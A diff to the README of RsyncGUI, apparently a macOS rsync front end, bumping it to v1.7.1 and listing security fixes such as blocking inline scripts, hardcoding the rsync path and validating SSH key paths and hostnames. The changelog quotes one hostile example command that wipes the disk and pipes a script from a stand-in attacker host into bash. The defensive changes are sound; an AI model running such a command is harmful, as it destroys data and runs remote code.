@@ -1,4 +1,4 @@
-# RsyncGUI v1.7.0
+# RsyncGUI v1.7.1
 
 ![Build](https://github.com/kochj23/RsyncGUI/actions/workflows/build.yml/badge.svg)
 
@@ -517,6 +517,12 @@ node_modules/  # Exclude entire directories
 ---
 
 ## Version History
+
+### v1.7.1 (March 4, 2026) — Current
+- **Security: Inline shell commands blocked** — `runScript()` now requires an absolute path to an executable file. Inline bash commands (e.g. `rm -rf /; curl attacker.com | bash`) are rejected, preventing shell injection via user-configured pre/post sync scripts.
+- **Security: Rsync binary hardcoded** — no longer reads executable path from UserDefaults (prevented binary substitution attack). Resolves from fixed list: `/usr/bin/rsync`, `/opt/homebrew/bin/rsync`, `/usr/local/bin/rsync`.
+- **Security: SSH key path validation** — key path must be an absolute path to an existing file with no `..` traversal sequences.
+- **Security: Host/user validation** — remote hostname and username validated against `^[a-zA-Z0-9._-]+$` before use in rsync commands.
 
 ### v1.7.0 (February 2026)
 - Comprehensive security audit: 30 findings resolved (3 CRITICAL, 8 HIGH, 5 MEDIUM, 7 LOW, 2 INFO)
